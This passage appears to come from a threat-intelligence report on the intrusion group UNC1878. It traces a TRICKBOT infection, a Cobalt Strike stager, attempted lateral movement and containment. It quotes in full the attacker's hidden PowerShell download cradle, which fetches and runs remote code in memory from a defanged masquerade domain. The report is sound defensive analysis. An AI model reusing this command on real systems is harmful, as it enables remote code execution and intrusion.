Initial Reconnaissance Approximately twenty minutes after reconnaissance, the adversary ran a PowerShell command to download and execute a Cobalt Strike HTTPS BEACON stager in memory (Figure 2).
cmd.exe /c powershell.exe -nop –w hidden –c “IEX ((new-object net.webclient).downloadstring(‘hxxps://cylenceprotect[.]com:80/abresgbserthgsbabrt’))” Figure 2: PowerShell download cradle used to request a Cobalt Strike stager Six minutes later, Managed Defense identified evidence of enumeration and attempted lateral movement through the BEACON implant.
Managed Defense alerted the client of the activity and the affected hosts were contained, stopping the intrusion in its tracks.
A delta of approximately forty-six minutes between a TRICKBOT infection and attempted lateral movement was highly unusual and, along with the clever masquerade domain, warranted further examination by our team.
Although light, indicators from this intrusion were distinct enough to create an uncategorized threat group, referred to as UNC1878.
At the time of initial clustering, UNC1878’s intent was not fully understood due to the rapid containment of the intrusion by Managed Defense.
By creating this label, we are able to link activity from the Managed Defense investigation into a single entity, allowing us to expand our understanding of this group and track their activity over time.
This is especially important when dealing with campaigns involving mass malware, as it helps delineate the interactive actor from the malware campaign they are leveraging.
